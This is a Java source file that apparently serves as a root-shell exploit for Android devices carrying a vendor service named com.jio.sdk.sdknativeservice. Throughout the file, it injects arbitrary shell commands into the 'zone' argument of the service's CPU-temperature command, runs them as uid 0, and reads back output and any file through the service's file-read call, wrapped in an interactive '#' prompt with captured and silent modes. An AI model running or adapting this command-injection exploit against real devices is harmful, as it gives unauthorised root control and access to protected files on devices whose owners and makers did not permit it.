import android.os.IBinder;
import android.os.Parcel;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class RootShell2 {
    static final String SVC = "com.jio.sdk.sdknativeservice";
    static final String DESC =
        "com.jio.sdk.platform.nativeservice.aidl.IJioSDKNativeServiceInterface";
    static final String OUT = "/mnt/vendor/param/.rs_out";

    static IBinder binder;

    public static void main(String[] args) throws Exception {
        Class<?> sm = Class.forName("android.os.ServiceManager");
        binder = (IBinder) sm.getMethod("getService", String.class).invoke(null, SVC);
        if (binder == null) { System.err.println("Service not found"); return; }

        if (args.length > 0 && args[0].equals("-c")) {
            String cmd = join(args, 1);
            runCapture(cmd);
            return;
        }
        if (args.length > 0 && args[0].equals("-x")) {
            String cmd = join(args, 1);
            runSilent(cmd);
            return;
        }
        if (args.length > 0 && args[0].equals("-r")) {
            String path = args.length > 1 ? args[1] : "";
            String c = readFile(path);
            if (c != null) System.out.print(c);
            return;
        }

        System.out.println("rootshell v2 — sdknativeservice (uid 0)");
        System.out.println("Prefixes:");
        System.out.println("  <cmd>     run cmd, show output");
        System.out.println("  !<cmd>    run cmd silently (sysfs writes, redirects)");
        System.out.println("  ?<path>   read file via service API");
        System.out.println("  exit      quit");
        System.out.println("CLI: -c <cmd> (captured) | -x <cmd> (silent) | -r <path> (read)");
        System.out.println();

        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
        String line;
        while (true) {
            System.out.print("# ");
            System.out.flush();
            line = br.readLine();
            if (line == null || line.equals("exit")) break;
            line = line.trim();
            if (line.isEmpty()) continue;

            if (line.startsWith("!")) {
                runSilent(line.substring(1).trim());
            } else if (line.startsWith("?")) {
                String path = line.substring(1).trim();
                String content = readFile(path);
                if (content != null) System.out.print(content);
                System.out.println();
            } else {
                runCapture(line);
            }
        }
        popen("rm -f " + OUT + " 2>/dev/null; printf 0");
    }

    static void runCapture(String cmd) {
        String wrapped = "sh -c " + shellQuote(cmd) + " > " + OUT + " 2>&1; printf 0";
        popen(wrapped);
        String output = readFile(OUT);
        if (output != null && !output.isEmpty()) {
            System.out.print(output);
            if (!output.endsWith("\n")) System.out.println();
        }
    }

    static void runSilent(String cmd) {
        String wrapped = "sh -c " + shellQuote(cmd) + " 2>&1; printf 0";
        String ret = popen(wrapped);
        if (ret != null && !ret.equals("0") && !ret.isEmpty()) {
            System.out.println(ret);
        }
    }

    static String shellQuote(String s) {
        return "'" + s.replace("'", "'\"'\"'") + "'";
    }

    static String popen(String cmd) {
        return call(new String[]{
            "module:os", "cmd:get-cpu-temperature", "zone:" + cmd
        });
    }

    static String readFile(String path) {
        return call(new String[]{
            "module:os", "cmd:read-content-from-file", "path:" + path
        });
    }

    static String call(String[] a) {
        Parcel d = Parcel.obtain(), r = Parcel.obtain();
        try {
            d.writeInterfaceToken(DESC);
            d.writeInt(4);
            d.writeStringArray(a);
            binder.transact(1, d, r, 0);
            r.readException();
            return r.readString();
        } catch (Exception e) {
            System.err.println("IPC error: " + e.getMessage());
            return null;
        } finally { d.recycle(); r.recycle(); }
    }

    static String join(String[] a, int from) {
        StringBuilder sb = new StringBuilder();
        for (int i = from; i < a.length; i++) {
            if (i > from) sb.append(' ');
            sb.append(a[i]);
        }
        return sb.toString();
    }
}
